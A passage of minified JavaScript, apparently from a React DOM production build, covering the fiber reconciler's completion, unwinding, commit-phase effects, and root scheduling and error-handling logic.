e.flags&128?(e.lanes=n,e):(i=i!==null,i!==(t!==null&&t.memoizedState!==null)&&i&&(e.child.flags|=8192,e.mode&1&&(t===null||gt.current&1?Lt===0&&(Lt=3):Kp())),e.updateQueue!==null&&(e.flags|=4),Xt(e),null);case 4:return Lr(),nd(t,e),t===null&&ka(e.stateNode.containerInfo),Xt(e),null;case 10:return Np(e.type._context),Xt(e),null;case 17:return hn(e.type)&&bl(),Xt(e),null;case 19:if(ft(gt),r=e.memoizedState,r===null)return Xt(e),null;if(i=(e.flags&128)!==0,a=r.rendering,a===null)if(i)Qr(r,!1);else{if(Lt!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(a=Rl(t),a!==null){for(e.flags|=128,Qr(r,!1),i=a.updateQueue,i!==null&&(e.updateQueue=i,e.flags|=4),e.subtreeFlags=0,i=n,n=e.child;n!==null;)r=n,t=i,r.flags&=14680066,a=r.alternate,a===null?(r.childLanes=0,r.lanes=t,r.child=null,r.subtreeFlags=0,r.memoizedProps=null,r.memoizedState=null,r.updateQueue=null,r.dependencies=null,r.stateNode=null):(r.childLanes=a.childLanes,r.lanes=a.lanes,r.child=a.child,r.subtreeFlags=0,r.deletions=null,r.memoizedProps=a.memoizedProps,r.memoizedState=a.memoizedState,r.updateQueue=a.updateQueue,r.type=a.type,t=a.dependencies,r.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),n=n.sibling;return dt(gt,gt.current&1|2),e.child}t=t.sibling}r.tail!==null&&Et()>Nr&&(e.flags|=128,i=!0,Qr(r,!1),e.lanes=4194304)}else{if(!i)if(t=Rl(a),t!==null){if(e.flags|=128,i=!0,n=t.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),Qr(r,!0),r.tail===null&&r.tailMode==="hidden"&&!a.alternate&&!mt)return Xt(e),null}else 2*Et()-r.renderingStartTime>Nr&&n!==1073741824&&(e.flags|=128,i=!0,Qr(r,!1),e.lanes=4194304);r.isBackwards?(a.sibling=e.child,e.child=a):(n=r.last,n!==null?n.sibling=a:e.child=a,r.last=a)}return r.tail!==null?(e=r.tail,r.rendering=e,r.tail=e.sibling,r.renderingStartTime=Et(),e.sibling=null,n=gt.current,dt(gt,i?n&1|2:n&1),e):(Xt(e),null);case 22:case 23:return $p(),i=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==i&&(e.flags|=8192),i&&e.mode&1?yn&1073741824&&(Xt(e),e.subtreeFlags&6&&(e.flags|=8192)):Xt(e),null;case 24:return null;case 25:return null}throw Error(se(156,e.tag))}function Ny(t,e){switch(Rp(e),e.tag){case 1:return hn(e.type)&&bl(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return Lr(),ft(pn),ft(Jt),Fp(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return Op(e),null;case 13:if(ft(gt),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error(se(340));Rr()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return ft(gt),null;case 4:return Lr(),null;case 10:return Np(e.type._context),null;case 22:case 23:return $p(),null;case 24:return null;default:return null}}var Mo=!1,$t=!1,Dy=typeof WeakSet=="function"?WeakSet:Set,_e=null;function vr(t,e){var n=t.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(i){wt(t,e,i)}else n.current=null}function id(t,e,n){try{n()}catch(i){wt(t,e,i)}}var Af=!1;function Iy(t,e){if(zu=_l,t=Zg(),Ap(t)){if("selectionStart"in t)var n={start:t.selectionStart,end:t.selectionEnd};else e:{n=(n=t.ownerDocument)&&n.defaultView||window;var i=n.getSelection&&n.getSelection();if(i&&i.rangeCount!==0){n=i.anchorNode;var s=i.anchorOffset,r=i.focusNode;i=i.focusOffset;try{n.nodeType,r.nodeType}catch{n=null;break e}var a=0,o=-1,l=-1,c=0,d=0,p=t,h=null;t:for(;;){for(var f;p!==n||s!==0&&p.nodeType!==3||(o=a+s),p!==r||i!==0&&p.nodeType!==3||(l=a+i),p.nodeType===3&&(a+=p.nodeValue.length),(f=p.firstChild)!==null;)h=p,p=f;for(;;){if(p===t)break t;if(h===n&&++c===s&&(o=a),h===r&&++d===i&&(l=a),(f=p.nextSibling)!==null)break;p=h,h=p.parentNode}p=f}n=o===-1||l===-1?null:{start:o,end:l}}else n=null}n=n||{start:0,end:0}}else n=null;for(Vu={focusedElem:t,selectionRange:n},_l=!1,_e=e;_e!==null;)if(e=_e,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,_e=t;else for(;_e!==null;){e=_e;try{var _=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(_!==null){var y=_.memoizedProps,m=_.memoizedState,u=e.stateNode,g=u.getSnapshotBeforeUpdate(e.elementType===e.type?y:Vn(e.type,y),m);u.__reactInternalSnapshotBeforeUpdate=g}break;case 3:var x=e.stateNode.containerInfo;x.nodeType===1?x.textContent="":x.nodeType===9&&x.documentElement&&x.removeChild(x.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(se(163))}}catch(S){wt(e,e.return,S)}if(t=e.sibling,t!==null){t.return=e.return,_e=t;break}_e=e.return}return _=Af,Af=!1,_}function Sa(t,e,n){var i=e.updateQueue;if(i=i!==null?i.lastEffect:null,i!==null){var s=i=i.next;do{if((s.tag&t)===t){var r=s.destroy;s.destroy=void 0,r!==void 0&&id(e,n,r)}s=s.next}while(s!==i)}}function Jl(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var n=e=e.next;do{if((n.tag&t)===t){var i=n.create;n.destroy=i()}n=n.next}while(n!==e)}}function sd(t){var e=t.ref;if(e!==null){var n=t.stateNode;switch(t.tag){case 5:t=n;break;default:t=n}typeof e=="function"?e(t):e.current=t}}function qv(t){var e=t.alternate;e!==null&&(t.alternate=null,qv(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[ei],delete e[Da],delete e[Wu],delete e[vy],delete e[_y])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function Yv(t){return t.tag===5||t.tag===3||t.tag===4}function Cf(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||Yv(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function rd(t,e,n){var i=t.tag;if(i===5||i===6)t=t.stateNode,e?n.nodeType===8?n.parentNode.insertBefore(t,e):n.insertBefore(t,e):(n.nodeType===8?(e=n.parentNode,e.insertBefore(t,n)):(e=n,e.appendChild(t)),n=n._reactRootContainer,n!=null||e.onclick!==null||(e.onclick=Sl));else if(i!==4&&(t=t.child,t!==null))for(rd(t,e,n),t=t.sibling;t!==null;)rd(t,e,n),t=t.sibling}function ad(t,e,n){var i=t.tag;if(i===5||i===6)t=t.stateNode,e?n.insertBefore(t,e):n.appendChild(t);else if(i!==4&&(t=t.child,t!==null))for(ad(t,e,n),t=t.sibling;t!==null;)ad(t,e,n),t=t.sibling}var Bt=null,Hn=!1;function Di(t,e,n){for(n=n.child;n!==null;)$v(t,e,n),n=n.sibling}function $v(t,e,n){if(ii&&typeof ii.onCommitFiberUnmount=="function")try{ii.onCommitFiberUnmount(Wl,n)}catch{}switch(n.tag){case 5:$t||vr(n,e);case 6:var i=Bt,s=Hn;Bt=null,Di(t,e,n),Bt=i,Hn=s,Bt!==null&&(Hn?(t=Bt,n=n.stateNode,t.nodeType===8?t.parentNode.removeChild(n):t.removeChild(n)):Bt.removeChild(n.stateNode));break;case 18:Bt!==null&&(Hn?(t=Bt,n=n.stateNode,t.nodeType===8?Rc(t.parentNode,n):t.nodeType===1&&Rc(t,n),Ra(t)):Rc(Bt,n.stateNode));break;case 4:i=Bt,s=Hn,Bt=n.stateNode.containerInfo,Hn=!0,Di(t,e,n),Bt=i,Hn=s;break;case 0:case 11:case 14:case 15:if(!$t&&(i=n.updateQueue,i!==null&&(i=i.lastEffect,i!==null))){s=i=i.next;do{var r=s,a=r.destroy;r=r.tag,a!==void 0&&(r&2||r&4)&&id(n,e,a),s=s.next}while(s!==i)}Di(t,e,n);break;case 1:if(!$t&&(vr(n,e),i=n.stateNode,typeof i.componentWillUnmount=="function"))try{i.props=n.memoizedProps,i.state=n.memoizedState,i.componentWillUnmount()}catch(o){wt(n,e,o)}Di(t,e,n);break;case 21:Di(t,e,n);break;case 22:n.mode&1?($t=(i=$t)||n.memoizedState!==null,Di(t,e,n),$t=i):Di(t,e,n);break;default:Di(t,e,n)}}function Rf(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var n=t.stateNode;n===null&&(n=t.stateNode=new Dy),e.forEach(function(i){var s=Wy.bind(null,t,i);n.has(i)||(n.add(i),i.then(s,s))})}}function On(t,e){var n=e.deletions;if(n!==null)for(var i=0;i<n.length;i++){var s=n[i];try{var r=t,a=e,o=a;e:for(;o!==null;){switch(o.tag){case 5:Bt=o.stateNode,Hn=!1;break e;case 3:Bt=o.stateNode.containerInfo,Hn=!0;break e;case 4:Bt=o.stateNode.containerInfo,Hn=!0;break e}o=o.return}if(Bt===null)throw Error(se(160));$v(r,a,s),Bt=null,Hn=!1;var l=s.alternate;l!==null&&(l.return=null),s.return=null}catch(c){wt(s,e,c)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)Kv(e,t),e=e.sibling}function Kv(t,e){var n=t.alternate,i=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(On(e,t),Kn(t),i&4){try{Sa(3,t,t.return),Jl(3,t)}catch(y){wt(t,t.return,y)}try{Sa(5,t,t.return)}catch(y){wt(t,t.return,y)}}break;case 1:On(e,t),Kn(t),i&512&&n!==null&&vr(n,n.return);break;case 5:if(On(e,t),Kn(t),i&512&&n!==null&&vr(n,n.return),t.flags&32){var s=t.stateNode;try{Ea(s,"")}catch(y){wt(t,t.return,y)}}if(i&4&&(s=t.stateNode,s!=null)){var r=t.memoizedProps,a=n!==null?n.memoizedProps:r,o=t.type,l=t.updateQueue;if(t.updateQueue=null,l!==null)try{o==="input"&&r.type==="radio"&&r.name!=null&&_g(s,r),Pu(o,a);var c=Pu(o,r);for(a=0;a<l.length;a+=2){var d=l[a],p=l[a+1];d==="style"?wg(s,p):d==="dangerouslySetInnerHTML"?Sg(s,p):d==="children"?Ea(s,p):fp(s,d,p,c)}switch(o){case"input":Eu(s,r);break;case"textarea":xg(s,r);break;case"select":var h=s._wrapperState.wasMultiple;s._wrapperState.wasMultiple=!!r.multiple;var f=r.value;f!=null?xr(s,!!r.multiple,f,!1):h!==!!r.multiple&&(r.defaultValue!=null?xr(s,!!r.multiple,r.defaultValue,!0):xr(s,!!r.multiple,r.multiple?[]:"",!1))}s[Da]=r}catch(y){wt(t,t.return,y)}}break;case 6:if(On(e,t),Kn(t),i&4){if(t.stateNode===null)throw Error(se(162));s=t.stateNode,r=t.memoizedProps;try{s.nodeValue=r}catch(y){wt(t,t.return,y)}}break;case 3:if(On(e,t),Kn(t),i&4&&n!==null&&n.memoizedState.isDehydrated)try{Ra(e.containerInfo)}catch(y){wt(t,t.return,y)}break;case 4:On(e,t),Kn(t);break;case 13:On(e,t),Kn(t),s=t.child,s.flags&8192&&(r=s.memoizedState!==null,s.stateNode.isHidden=r,!r||s.alternate!==null&&s.alternate.memoizedState!==null||(qp=Et())),i&4&&Rf(t);break;case 22:if(d=n!==null&&n.memoizedState!==null,t.mode&1?($t=(c=$t)||d,On(e,t),$t=c):On(e,t),Kn(t),i&8192){if(c=t.memoizedState!==null,(t.stateNode.isHidden=c)&&!d&&t.mode&1)for(_e=t,d=t.child;d!==null;){for(p=_e=d;_e!==null;){switch(h=_e,f=h.child,h.tag){case 0:case 11:case 14:case 15:Sa(4,h,h.return);break;case 1:vr(h,h.return);var _=h.stateNode;if(typeof _.componentWillUnmount=="function"){i=h,n=h.return;try{e=i,_.props=e.memoizedProps,_.state=e.memoizedState,_.componentWillUnmount()}catch(y){wt(i,n,y)}}break;case 5:vr(h,h.return);break;case 22:if(h.memoizedState!==null){Lf(p);continue}}f!==null?(f.return=h,_e=f):Lf(p)}d=d.sibling}e:for(d=null,p=t;;){if(p.tag===5){if(d===null){d=p;try{s=p.stateNode,c?(r=s.style,typeof r.setProperty=="function"?r.setProperty("display","none","important"):r.display="none"):(o=p.stateNode,l=p.memoizedProps.style,a=l!=null&&l.hasOwnProperty("display")?l.display:null,o.style.display=bg("display",a))}catch(y){wt(t,t.return,y)}}}else if(p.tag===6){if(d===null)try{p.stateNode.nodeValue=c?"":p.memoizedProps}catch(y){wt(t,t.return,y)}}else if((p.tag!==22&&p.tag!==23||p.memoizedState===null||p===t)&&p.child!==null){p.child.return=p,p=p.child;continue}if(p===t)break e;for(;p.sibling===null;){if(p.return===null||p.return===t)break e;d===p&&(d=null),p=p.return}d===p&&(d=null),p.sibling.return=p.return,p=p.sibling}}break;case 19:On(e,t),Kn(t),i&4&&Rf(t);break;case 21:break;default:On(e,t),Kn(t)}}function Kn(t){var e=t.flags;if(e&2){try{e:{for(var n=t.return;n!==null;){if(Yv(n)){var i=n;break e}n=n.return}throw Error(se(160))}switch(i.tag){case 5:var s=i.stateNode;i.flags&32&&(Ea(s,""),i.flags&=-33);var r=Cf(t);ad(t,r,s);break;case 3:case 4:var a=i.stateNode.containerInfo,o=Cf(t);rd(t,o,a);break;default:throw Error(se(161))}}catch(l){wt(t,t.return,l)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function Uy(t,e,n){_e=t,Zv(t)}function Zv(t,e,n){for(var i=(t.mode&1)!==0;_e!==null;){var s=_e,r=s.child;if(s.tag===22&&i){var a=s.memoizedState!==null||Mo;if(!a){var o=s.alternate,l=o!==null&&o.memoizedState!==null||$t;o=Mo;var c=$t;if(Mo=a,($t=l)&&!c)for(_e=s;_e!==null;)a=_e,l=a.child,a.tag===22&&a.memoizedState!==null?kf(s):l!==null?(l.return=a,_e=l):kf(s);for(;r!==null;)_e=r,Zv(r),r=r.sibling;_e=s,Mo=o,$t=c}Pf(t)}else s.subtreeFlags&8772&&r!==null?(r.return=s,_e=r):Pf(t)}}function Pf(t){for(;_e!==null;){var e=_e;if(e.flags&8772){var n=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:$t||Jl(5,e);break;case 1:var i=e.stateNode;if(e.flags&4&&!$t)if(n===null)i.componentDidMount();else{var s=e.elementType===e.type?n.memoizedProps:Vn(e.type,n.memoizedProps);i.componentDidUpdate(s,n.memoizedState,i.__reactInternalSnapshotBeforeUpdate)}var r=e.updateQueue;r!==null&&ff(e,r,i);break;case 3:var a=e.updateQueue;if(a!==null){if(n=null,e.child!==null)switch(e.child.tag){case 5:n=e.child.stateNode;break;case 1:n=e.child.stateNode}ff(e,a,n)}break;case 5:var o=e.stateNode;if(n===null&&e.flags&4){n=o;var l=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&n.focus();break;case"img":l.src&&(n.src=l.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var c=e.alternate;if(c!==null){var d=c.memoizedState;if(d!==null){var p=d.dehydrated;p!==null&&Ra(p)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(se(163))}$t||e.flags&512&&sd(e)}catch(h){wt(e,e.return,h)}}if(e===t){_e=null;break}if(n=e.sibling,n!==null){n.return=e.return,_e=n;break}_e=e.return}}function Lf(t){for(;_e!==null;){var e=_e;if(e===t){_e=null;break}var n=e.sibling;if(n!==null){n.return=e.return,_e=n;break}_e=e.return}}function kf(t){for(;_e!==null;){var e=_e;try{switch(e.tag){case 0:case 11:case 15:var n=e.return;try{Jl(4,e)}catch(l){wt(e,n,l)}break;case 1:var i=e.stateNode;if(typeof i.componentDidMount=="function"){var s=e.return;try{i.componentDidMount()}catch(l){wt(e,s,l)}}var r=e.return;try{sd(e)}catch(l){wt(e,r,l)}break;case 5:var a=e.return;try{sd(e)}catch(l){wt(e,a,l)}}}catch(l){wt(e,e.return,l)}if(e===t){_e=null;break}var o=e.sibling;if(o!==null){o.return=e.return,_e=o;break}_e=e.return}}var Oy=Math.ceil,kl=Ni.ReactCurrentDispatcher,jp=Ni.ReactCurrentOwner,Dn=Ni.ReactCurrentBatchConfig,$e=0,Ft=null,Ct=null,Ht=0,yn=0,_r=ds(0),Lt=0,za=null,Fs=0,Ql=0,Xp=0,ba=null,cn=null,qp=0,Nr=1/0,vi=null,Nl=!1,od=null,is=null,Eo=!1,$i=null,Dl=0,wa=0,ld=null,sl=-1,rl=0;function nn(){return $e&6?Et():sl!==-1?sl:sl=Et()}function ss(t){return t.mode&1?$e&2&&Ht!==0?Ht&-Ht:yy.transition!==null?(rl===0&&(rl=Ig()),rl):(t=rt,t!==0||(t=window.event,t=t===void 0?16:Hg(t.type)),t):1}function qn(t,e,n,i){if(50<wa)throw wa=0,ld=null,Error(se(185));Za(t,n,i),(!($e&2)||t!==Ft)&&(t===Ft&&(!($e&2)&&(Ql|=n),Lt===4&&Xi(t,Ht)),fn(t,i),n===1&&$e===0&&!(e.mode&1)&&(Nr=Et()+500,$l&&ps()))}function fn(t,e){var n=t.callbackNode;yx(t,e);var i=vl(t,t===Ft?Ht:0);if(i===0)n!==null&&zh(n),t.callbackNode=null,t.callbackPriority=0;else if(e=i&-i,t.callbackPriority!==e){if(n!=null&&zh(n),e===1)t.tag===0?xy(Nf.bind(null,t)):ov(Nf.bind(null,t)),my(function(){!($e&6)&&ps()}),n=null;else{switch(Ug(i)){case 1:n=xp;break;case 4:n=Ng;break;case 16:n=gl;break;case 536870912:n=Dg;break;default:n=gl}n=r0(n,Jv.bind(null,t))}t.callbackPriority=e,t.callbackNode=n}}function Jv(t,e){if(sl=-1,rl=0,$e&6)throw Error(se(327));var n=t.callbackNode;if(Mr()&&t.callbackNode!==n)return null;var i=vl(t,t===Ft?Ht:0);if(i===0)return null;if(i&30||i&t.expiredLanes||e)e=Il(t,i);else{e=i;var s=$e;$e|=2;var r=e0();(Ft!==t||Ht!==e)&&(vi=null,Nr=Et()+500,Ns(t,e));do try{zy();break}catch(o){Qv(t,o)}while(!0);kp(),kl.current=r,$e=s,Ct!==null?e=0:(Ft=null,Ht=0,e=Lt)}if(e!==0){if(e===2&&(s=Iu(t),s!==0&&(i=s,e=cd(t,s))),e===1)throw n=za,Ns(t,0),Xi(t,i),fn(t,Et()),n;if(e===6)Xi(t,i);else{if(s=t.current.alternate,!(i&30)&&!Fy(s)&&(e=Il(t,i),e===2&&(r=Iu(t),r!==0&&(i=r,e=cd(t,r))),e===1))throw n=za,Ns(t,0),Xi(t,i),fn(t,Et()),n;switch(t.finishedWork=s,t.finishedLanes=i,e){case 0:case 1:throw Error(se(345));case 2:ws(t,cn,vi);break;case 3:if(Xi(t,i),(i&130023424)===i&&(e=qp+500-Et(),10<e)){if(vl(t,0)!==0)break;if(s=t.suspendedLanes,(s&i)!==i){nn(),t.pingedLanes|=t.suspendedLanes&s;break}t.timeoutHandle=Gu(ws.bind(null,t,cn,vi),e);break}ws(t,cn,vi);break;case 4:if(Xi(t,i),(i&4194240)===i)break;for(e=t.eventTimes,s=-1;0<i;){var a=31-Xn(i);r=1<<a,a=e[a],a>s&&(s=a),i&=~r}if(i=s,i=Et()-i,i=(120>i?120:480>i?480:1080>i?1080:1920>i?1920:3e3>i?3e3:4320>i?4320:1960*Oy(i/1960))-i,10<i){t.timeoutHandle=Gu(ws.bind(null,t,cn,vi),i);break}ws(t,cn,vi);break;case 5:ws(t,cn,vi);break;default:throw Error(se(329))}}}return fn(t,Et()),t.callbackNode===n?Jv.bind(null,t):null}function cd(t,e){var n=ba;return t.current.memoizedState.isDehydrated&&(Ns(t,e).flags|=256),t=Il(t,e),t!==2&&(e=cn,cn=n,e!==null&&ud(e)),t}function ud(t){cn===null?cn=t:cn.push.apply(cn,t)}function Fy(t){for(var e=t;;){if(e.flags&16384){var n=e.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var i=0;i<n.length;i++){var s=n[i],r=s.getSnapshot;s=s.value;try{if(!Yn(r(),s))return!1}catch{return!1}}}if(n=e.child,e.subtreeFlags&16384&&n!==null)n.return=e,e=n;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function Xi(t,e){for(e&=~Xp,e&=~Ql,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var n=31-Xn(e),i=1<<n;t[n]=-1,e&=~i}}function Nf(t){if($e&6)throw Error(se(327));Mr();var e=vl(t,0);if(!(e&1))return fn(t,Et()),null;var n=Il(t,e);if(t.tag!==0&&n===2){var i=Iu(t);i!==0&&(e=i,n=cd(t,i))}if(n===1)throw n=za,Ns(t,0),Xi(t,e),fn(t,Et()),n;if(n===6)throw Error(se(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,ws(t,cn,vi),fn(t,Et()),null}function Yp(t,e){var n=$e;$e|=1;try{return t(e)}finally{$e=n,$e===0&&(Nr=Et()+500,$l&&ps())}}function Bs(t){$i!==null&&$i.tag===0&&!($e&6)&&Mr();var e=$e;$e|=1;var n=Dn.transition,i=rt;try{if(Dn.transition=null,rt=1,t)return t()}finally{rt=i,Dn.transition=n,$e=e,!($e&6)&&ps()}}function $p(){yn=_r.current,ft(_r)}function Ns(t,e){t.finishedWork=null,t.finishedLanes=0;var n=t.timeoutHandle;if(n!==-1&&(t.timeoutHandle=-1,fy(n)),Ct!==null)for(n=Ct.return;n!==null;){var i=n;switch(Rp(i),i.tag){case 1:i=i.type.childContextTypes,i!=null&&bl();break;case 3:Lr(),ft(pn),ft(Jt),Fp();break;case 5:Op(i);break;case 4:Lr();break;case 13:ft(gt);break;case 19:ft(gt);break;case 10:Np(i.type._context);break;case 22:case 23:$p()}n=n.return}if(Ft=t,Ct=t=rs(t.current,null),Ht=yn=e,Lt=0,za=null,Xp=Ql=Fs=0,cn=ba=null,Cs!==null){for(e=0;e<Cs.length;e++)if(n=Cs[e],i=n.interleaved,i!==null){n.interleaved=null;var s=i.next,r=n.pending;if(r!==null){var a=r.next;r.next=s,i.next=a}n.pending=i}Cs=null}return t}function Qv(t,e){do{var n=Ct;try{if(kp(),tl.current=Ll,Pl){for(var i=vt.memoizedState;i!==null;){var s=i.queue;s!==null&&(s.pending=null),i=i.next}Pl=!1}if(Os=0,Ut=Pt=vt=null,ya=!1,Oa=0,jp.current=null,n===null||n.return===null){Lt=1,za=e,Ct=null;break}e:{var r=t,a=n.return,o=n,l=e;if(e=Ht,o.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){var c=l,d=o,p=d.tag;if(!(d.mode&1)&&(p===0||p===11||p===15)){var h=d.alternate;h?(d.updateQueue=h.updateQueue,d.memoizedState=h.memoizedState,d.lanes=h.lanes):(d.updateQueue=null,d.memoizedState=null)}var f=yf(a);if(f!==null){f.flags&=-257,Sf(f,a,o,r,e),f.mode&1&&xf(r,c,e),e=f,l=c;var _=e.updateQueue;if(_===null){var y=new Set;y.add(l),e.updateQueue=y}else _.add(l);break e}else{if(!(e&1)){xf(r,c,e),Kp();break e}l=Error(se(426))}}else if(mt&&o.mode&1){var m=yf(a);if(m!==null){!(m.flags&65536)&&(m.flags|=256),Sf(m,a,o,r,e),Pp(kr(l,o));break e}}r=l=kr(l,o),Lt!==4&&(Lt=2),ba===null?ba=[r]:ba.push(r),r=a;do{switch(r.tag){case 3:r.flags|=65536,e&=-e,r.lanes|=e;var u=Uv(r,l,e);hf(r,u);break e;case 1:o=l;var g=r.type,x=r.stateNode;if(!(r.flags&128)&&(typeof g.getDerivedStateFromError=="function"||x!==null&&typeof x.componentDidCatch=="function"&&(is===null||!is.has(x)))){r.flags|=65536,e&=-e,r.lanes|=e;var S=Ov(r,o,e);hf(r,S);break e}}r=r.return}while(r!==null)}n0(n)}catch(T){e=T,Ct===n&&n!==null&&(Ct=n=n.return);continue}break}while(!0)}function e0(){var t=kl.current;return kl.current=Ll,t===null?Ll:t}function Kp(){(Lt===0||Lt===3||Lt===2)&&(Lt=4),Ft===null||!(Fs&268435455)&&!(Ql&268435455)||Xi(Ft,Ht)}function Il(t,e){var n=$e;$e|=2;var i=e0();(Ft!==t||Ht!==e)&&(vi=null,Ns(t,e));do try{By();break}catch(s){Qv(t,s)}while(!0);if(kp(),$e=n,kl.current=i,Ct!==null)throw Error(se(261));return Ft=null,Ht=0,Lt}function By(){for(;Ct!==null;)t0(Ct)}function zy(){for(;Ct!==null&&!dx();)t0(Ct)}function t0(t){var e=s0(t.alternate,t,yn);t.memoizedProps=t.pendingProps,e===null?n0(t):Ct=e,jp.current=null}function n0(t){var e=t;do{var n=e.alternate;if(t=e.return,e.flags&32768){if(n=Ny(n,e),n!==null){n.flags&=32767,Ct=n;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{Lt=6,Ct=null;return}}else if(n=ky(n,e,yn),n!==null){Ct=n;return}if(e=e.sibling,e!==null){Ct=e;return}Ct=e=t}while(e!==null);Lt===0&&(Lt=5)}function ws(t,e,n){var i=rt,s=Dn.transition;try{Dn.transition=null,rt=1,Vy(t,e,n,i)}finally{Dn.transition=s,rt=i}return null}function Vy(t,e,n,i){do Mr();while($i!==null);if($e&6)throw Error(se(327));n=t.finishedWork;var s=t.finishedLanes;if(n===null)return null;if(t.finishedWork=null,t.finishedLanes=0,n===t.current)throw Error(se(177));t.callbackNode=null,t.callbackPriority=0;var r=n.lanes|n.childLanes;if(Sx(t,r),t===Ft&&(Ct=Ft=null,Ht=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||Eo||(Eo=!0,r0(gl,function(){return Mr(),null})),r=(n.flags&15990)!==0,n.subtreeFlags&15990||r){r=Dn.transition,Dn.transition=null;var a=rt;rt=1;var o=$e;$e|=4,jp.current=null,Iy(t,n),Kv(n,t),oy(Vu),_l=!!zu,Vu=zu=null,t.current=n,Uy(n),px(),$e=o,rt=a,Dn.transition=r}else t.current=n;if(Eo&&(Eo=!1,$i=t,Dl=s),r=t.pendingLanes,r===0&&(is=null),mx(n.stateNode),fn(t,Et()),e!==null)for(i=t.onRecoverableError,n=0;n<e.length;n++)s=e[n],i(s.value,{componentStack:s.stack,digest:s.digest});if(Nl)throw Nl=!1,t=od,od=null,t;return Dl&1&&t.tag!==0&&Mr(),r=t.pendingLanes,r&1?t===ld?wa++:(wa=0,ld=t):wa=0,ps(),null}function Mr(){if($i!==null){var t=Ug(Dl),e=Dn.transition,n=rt;try{if(Dn.transition=null,rt=16>t?16:t,$i===null)var i=!1;else{if(t=$i,$i=null,Dl=0,$e&6)throw Error(se(331));var s=$e;for($e|=4,_e=t.current;_e!==null;){var r=_e,a=r.child;if(_e.flags&16){var o=r.deletions;if(o!==null){for(var l=0;l<o.length;l++){var c=o[l];for(_e=c;_e!==null;){var d=_e;switch(d.tag){case 0:case 11:case 15:Sa(8,d,r)}var p=d.child;if(p!==null)p.return=d,_e=p;else for(;_e!==null;){d=_e;var h=d.sibling,f=d.return;if(qv(d),d===c){_e=null;break}if(h!==null){h.return=f,_e=h;break}_e=f}}}var _=r.alternate;if(_!==null){var y=_.child;if(y!==null){_.child=null;do{var m=y.sibling;y.sibling=null,y=m}while(y!==null)}}_e=r}}if(r.subtreeFlags&2064&&a!==null)a.return=r,_e=a;else e:for(;_e!==null;){if(r=_e,r.flags&2048)switch(r.tag){case 0:case 11:case 15:Sa(9,r,r.return)}var u=r.sibling;if(u!==null){u.return=r.return,_e=u;break e}_e=r.return}}var g=t.current;for(_e=g;_e!==null;){a=_e;var x=a.child;if(a.subtreeFlags&2064&&x!==null)x.return=a,_e=x;else e:for(a=g;_e!==null;){if(o=_e,o.flags&2048)try{switch(o.tag){case 0:case 11:case 15:Jl(9,o)}}catch(T){wt(o,o.return,T)}if(o===a){_e=null;break e}var S=o.sibling;if(S!==null){S.return=o.return,_e=S;break e}_e=o.return}}if($e=s,ps(),ii&&typeof ii.onPostCommitFiberRoot=="function")try{ii.onPostCommitFiberRoot(Wl,t)}catch{}i=!0}return i}finally{rt=n,Dn.transition=e}}return!1}function Df(t,e,n){e=kr(n,e),e=Uv(t,e,1),t=ns(t,e,1),e=nn(),t!==null&&(Za(t,1,e),fn(t,e))}function wt(t,e,n){if(t.tag===3)Df(t,t,n);else for(;e!==null;){if(e.tag===3){Df(e,t,n);break}else if(e.tag===1){var i=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof i.componentDidCatch=="function"&&(is===null||!is.has(i))){t=kr(n,t),t=Ov(e,t,1),e=ns(e,t,1),t=nn(),e!==null&&(Za(e,1,t),fn(e,t));break}}e=e.return}}function Hy(t,e,n){var i=t.pingCache;i!==null&&i.delete(e),e=nn(),t.pingedLanes|=t.suspendedLanes&n,Ft===t&&(Ht&n)===n&&(Lt===4||Lt===3&&(Ht&130023424)===Ht&&500>Et()-qp?Ns(t,0):Xp|=n),fn(t,e)}function i0(t,e){e===0&&(t.mode&1?(e=mo,mo<<=1,!(mo&130023424)&&(mo=4194304)):e=1);var n=nn();t=Ri(t,e),t!==null&&(Za(t,e,n),fn(t,n))}function Gy(t){var e=t.memoizedState,n=0;e!==null&&(n=e.retryLane),i0(t,n)}function Wy(t,e){var n=0;switch(t.tag){case 13:var i=t.stateNode,s=t.memoizedState;s!==null&&(n=s.retryLane);break;case 19:i=t.stateNode;break;default:throw Error(se(314))}i!==null&&i.delete(e),i0(t,n)}var 